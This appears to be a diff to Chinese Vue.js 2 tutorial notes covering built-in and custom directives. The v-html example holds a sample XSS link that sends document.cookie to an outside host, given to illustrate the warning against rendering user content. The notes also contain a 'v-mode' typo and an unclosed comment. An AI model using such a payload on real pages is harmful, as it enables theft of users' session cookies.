@@ -191,7 +191,7 @@ html 中包含了一些 JS 语法代码，语法分为两种，分别为：
 
 
 
-### **1.3.4. 指令语法**
+### **1.3.4. 指令语法 v-bind**
 
 1. 功能：用于解析标签（包括：标签属性、标签体内容、绑定事件.....）
 2. 举例：`v-bind:href="xxx"` 或  简写为 `:href="xxx"`，xxx同样要写js表达式，且可以直接读取到data中的所有属性。
@@ -235,14 +235,14 @@ html 中包含了一些 JS 语法代码，语法分为两种，分别为：
 
 
 
-### **1.4.2. 单向数据绑定**
+### **1.4.2. 单向数据绑定 v-bind**
 
 1. 语法：`v-bind:href ="xxx"` 或简写为 `:href`
 2. 特点：数据只能从 data 流向页面
 
 
 
-### **1.4.3. 双向数据绑定**
+### **1.4.3. 双向数据绑定 v-mode**
 
 1. 语法：`v-mode:value="xxx"` 或简写为 `v-model="xxx"`
 2. 特点：数据不仅能从 data 流向页面，还能从页面流向 data
@@ -510,7 +510,7 @@ html 中包含了一些 JS 语法代码，语法分为两种，分别为：
 
 
 
-### **1.8.2. 绑定监听**
+### **1.8.2. 绑定监听 v-on**
 
 1. `v-on:xxx="fun"`
 2. `@xxx="fun"`
@@ -1502,7 +1502,6 @@ computed: {
 		Vue.filter('mySlice',function(value){
 			return value.slice(0,4)
 		})
-		
 		new Vue({
 			el:'#root',
 			data:{
@@ -1526,7 +1525,6 @@ computed: {
 				}
 			}
 		})
-
 		new Vue({
 			el:'#root2',
 			data:{
@@ -1548,4 +1546,390 @@ computed: {
 - 注意：
   1. 过滤器也可以**接收额外参数**、**多个过滤器也可以串联**
   2. 并**没有改变原本的数据**, 是产生新的对应的数据
+
+## 1.17. **内置指令**
+
+### 1.17.1. v-text
+
+1. 作用：向其所在的节点中渲染文本内容。
+2. 与插值语法的区别：v-text会替换掉节点中的内容，{{xx}}则不会。
+
+```html
+<!DOCTYPE html>
+<html>
+	<head>
+		<meta charset="UTF-8" />
+		<title>v-text指令</title>
+		<!-- 引入Vue -->
+		<script type="text/javascript" src="../js/vue.js"></script>
+	</head>
+	<body>
+		<!-- 准备好一个容器-->
+		<div id="root">
+			<div>你好，{{name}}</div>
+			<div v-text="name"></div>
+			<div v-text="str"></div>
+		</div>
+	</body>
+	<script type="text/javascript">
+		Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。
+		new Vue({
+			el:'#root',
+			data:{
+				name:'尚硅谷',
+				str:'<h3>你好啊！</h3>'
+			}
+		})
+	</script>
+</html>
+```
+
+
+
+### 1.17.2. v-html
+
+1. 作用：向指定节点中渲染包含html结构的内容。
+2. 与插值语法的区别：
+   - v-html会**替换掉节点中所有的内容**，{{xx}}则不会。
+   - v-html可以**识别html结构**。
+3. 严重注意：**v-html有安全性问题**！！！！
+   - 在网站上动态渲染任意HTML是非常危险的，容易导致XSS攻击。
+   - 一定要在可信的内容上使用v-html，永不要用在用户提交的内容上！
+
+```html
+<!DOCTYPE html>
+<html>
+	<head>
+		<meta charset="UTF-8" />
+		<title>v-html指令</title>
+		<!-- 引入Vue -->
+		<script type="text/javascript" src="../js/vue.js"></script>
+	</head>
+	<body>
+		<!-- 准备好一个容器-->
+		<div id="root">
+			<div>你好，{{name}}</div>
+			<div v-html="str"></div>
+			<div v-html="str2"></div>
+		</div>
+	</body>
+	<script type="text/javascript">
+		Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。
+		new Vue({
+			el:'#root',
+			data:{
+				name:'尚硅谷',
+				str:'<h3>你好啊！</h3>',
+				str2:'<a href=javascript:location.href="http://www.baidu.com?"+document.cookie>兄弟我找到你想要的资源了，快来！</a>',
+			}
+		})
+	</script>
+</html>
+```
+
+
+
+### 1.17.3. v-cloak
+
+1. v-cloak指令（**没有值**）
+2. 本质是一个特殊属性，Vue实例**创建完毕并接管容器后**，会**删掉v-cloak属性**
+3. **使用css配合v-cloak**可以解决网速慢时页面展示出{{xxx}}的问题
+
+```html
+<!DOCTYPE html>
+<html>
+	<head>
+		<meta charset="UTF-8" />
+		<title>v-cloak指令</title>
+		<style>
+			[v-cloak]{
+				display:none;
+			}
+		</style>
+		<!-- 引入Vue -->
+	</head>
+	<body>
+		<!-- 准备好一个容器-->
+		<div id="root">
+			<h2 v-cloak>{{name}}</h2>
+		</div>
+        <!-- 5s后引入该js-->
+		<script type="text/javascript" src="http://localhost:8080/resource/5s/vue.js"></script>
+	</body>
+	<script type="text/javascript">
+		console.log(1)
+		Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。
+		
+		new Vue({
+			el:'#root',
+			data:{
+				name:'尚硅谷'
+			}
+		})
+	</script>
+</html>
+```
+
+
+
+### 1.17.4. v-once
+
+1. v-once指令（**没有值**）
+2. v-once所在节点在初次动态渲染后，就视为**静态内容**了
+3. 以后**数据的改变不会引起v-once所在结构的更新**，可以用于优化性能
+
+```html
+<!DOCTYPE html>
+<html>
+	<head>
+		<meta charset="UTF-8" />
+		<title>v-once指令</title>
+		<!-- 引入Vue -->
+		<script type="text/javascript" src="../js/vue.js"></script>
+	</head>
+	<body>
+		<!-- 准备好一个容器-->
+		<div id="root">
+			<h2 v-once>初始化的n值是:{{n}}</h2>
+			<h2>当前的n值是:{{n}}</h2>
+			<button @click="n++">点我n+1</button>
+		</div>
+	</body>
+	<script type="text/javascript">
+		Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。
+		
+		new Vue({
+			el:'#root',
+			data:{
+				n:1
+			}
+		})
+	</script>
+</html>
+```
+
+
+
+### 1.17.5. v-pre
+
+1. v-pre指令（**没有值**）
+2. **跳过**其所在节点的**编译过程**
+3. 可利用它跳过：**没有使用指令语法、没有使用插值语法的节点，会加快编译**
+
+```html
+<!DOCTYPE html>
+<html>
+	<head>
+		<meta charset="UTF-8" />
+		<title>v-pre指令</title>
+		<!-- 引入Vue -->
+		<script type="text/javascript" src="../js/vue.js"></script>
+	</head>
+	<body>
+		<!-- 准备好一个容器-->
+		<div id="root">
+			<h2 v-pre>Vue其实很简单</h2>
+			<h2 >当前的n值是:{{n}}</h2>
+			<button @click="n++">点我n+1</button>
+		</div>
+	</body>
+	<script type="text/javascript">
+		Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。
+
+		new Vue({
+			el:'#root',
+			data:{
+				n:1
+			}
+		})
+	</script>
+</html>
+```
+
+
+
+### 1.17.6. 常用内置指令
+
+1. `v-text` : 更新元素的 textContent
+2. `v-html` : 更新元素的 innerHTML
+3. `v-if` : 如果为 true, 当前标签才会输出到页面
+4. `v-else`: 如果为 false, 当前标签才会输出到页面
+5. `v-show` : 通过控制 display 样式来控制显示/隐藏
+6. `v-for` : 遍历数组/对象
+7. `v-on` : 绑定事件监听, 一般简写为@
+8. `v-bind` : 绑定解析表达式, 可以省略 v-bind
+9. `v-model` : 双向数据绑定
+10. `v-cloak` : 防止闪现, 与 css 配合: [v-cloak] { display: none }
+
+
+
+## 1.18. 自定义指令
+
+### 1.18.1. 例子
+
+```html
+<!DOCTYPE html>
+<html>
+	<head>
+		<meta charset="UTF-8" />
+		<title>自定义指令</title>
+		<script type="text/javascript" src="../js/vue.js"></script>
+	</head>
+	<body>
+		<!-- 
+				需求1：定义一个v-big指令，和v-text功能类似，但会把绑定的数值放大10倍。
+				需求2：定义一个v-fbind指令，和v-bind功能类似，但可以让其所绑定的input元素默认获取焦点。
+		<!-- 准备好一个容器-->
+		<div id="root">
+			<h2>{{name}}</h2>
+			<h2>当前的n值是：<span v-text="n"></span> </h2>
+			<!-- <h2>放大10倍后的n值是：<span v-big-number="n"></span> </h2> -->
+			<h2>放大10倍后的n值是：<span v-big="n"></span> </h2>
+			<button @click="n++">点我n+1</button>
+			<hr/>
+			<input type="text" v-fbind:value="n">
+		</div>
+	</body>
+	
+	<script type="text/javascript">
+		Vue.config.productionTip = false
+
+		//定义全局指令
+		/* Vue.directive('fbind',{
+			//指令与元素成功绑定时（一上来）
+			bind(element,binding){
+				element.value = binding.value
+			},
+			//指令所在元素被插入页面时
+			inserted(element,binding){
+				element.focus()
+			},
+			//指令所在的模板被重新解析时
+			update(element,binding){
+				element.value = binding.value
+			}
+		}) */
+
+		new Vue({
+			el:'#root',
+			data:{
+				name:'尚硅谷',
+				n:1
+			},
+			directives:{
+				//big函数何时会被调用？1.指令与元素成功绑定时（一上来）。2.指令所在的模板被重新解析时。
+				/* 'big-number'(element,binding){
+					// console.log('big')
+					element.innerText = binding.value * 10
+				}, */
+				big(element,binding){
+					console.log('big',this) //注意此处的this是window
+					// console.log('big')
+					element.innerText = binding.value * 10
+				},
+				fbind:{
+					//指令与元素成功绑定时（一上来）
+					bind(element,binding){
+						element.value = binding.value
+					},
+					//指令所在元素被插入页面时
+					inserted(element,binding){
+						element.focus()
+					},
+					//指令所在的模板被重新解析时
+					update(element,binding){
+						element.value = binding.value
+					}
+				}
+			}
+		})
+		
+	</script>
+</html>
+```
+
+
+
+### 1.18.2. **局部指令**
+
+1. 函数式
+
+   ```js
+   directives:{
+       big(element,binding){
+           console.log('big',this) //注意此处的this是window
+           // console.log('big')
+           element.innerText = binding.value * 10
+       },
+   }
+   ```
+
+2. 对象式
+
+   ```js
+   directives:{
+       fbind:{
+           //指令与元素成功绑定时（一上来）
+           bind(element,binding){
+               element.value = binding.value
+           },
+           //指令所在元素被插入页面时
+           inserted(element,binding){
+               element.focus()
+           },
+           //指令所在的模板被重新解析时
+            update(element,binding){
+                element.value = binding.value
+            }
+       }
+   }
+   ```
+
+   
+
+### 1.18.3. 全局指令
+
+1. 函数式
+
+   ```js
+   Vue.directive('big',function(element, binding){
+       console.log('big',this) //注意此处的this是window
+       element.innerText = binding.value * 10
+   })
+   ```
+
+2. 对象式
+
+   ```js
+   Vue.directive('fbind',{
+       //指令与元素成功绑定时（一上来）
+       bind(element,binding){
+           element.value = binding.value
+       },
+       //指令所在元素被插入页面时
+       inserted(element,binding){
+           element.focus()
+       },
+       //指令所在的模板被重新解析时
+       update(element,binding){
+           element.value = binding.value
+       }
+   })
+   ```
+
+   
+
+### 1.18.4 总结
+
+1. 配置对象式中常用的3个回调：
+   - `bind`：指令与元素成功**绑定**时调用。
+   - `inserted`：指令所在元素被**插入**页面时调用。
+   - `update`：指令所在模板结构**被重新解析**时调用。
+2. 注意：
+   - **指令定义时不加v-，但使用时要加v-**；
+   - 指令名如果是多个单词，要使用**kebab-case**命名方式，不要用camelCase命名（）。
+
+> <span style="color:red;font-weight:bolder">kebab-case命名： </span>要求短语内的各个单词或缩写之间以`-`（连字符）做间隔。
+>
+> <span style="color:red;font-weight:bolder">camelCase命名：</span>驼峰式命名
 
